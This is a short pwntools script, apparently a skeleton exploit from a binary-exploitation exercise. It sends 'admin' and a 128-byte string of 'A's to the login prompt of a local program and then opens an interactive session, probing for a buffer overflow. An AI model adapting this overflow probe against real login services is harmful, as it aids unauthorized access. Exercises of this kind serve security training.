from pwn import *

context.arch = 'amd64'
context.os = 'linux'

r = process('./program_login') # Replace with the path to your target binary
r.sendlineafter('Username: ', 'admin')
r.sendlineafter('Password: ', 'A' * 128)
r.interactive()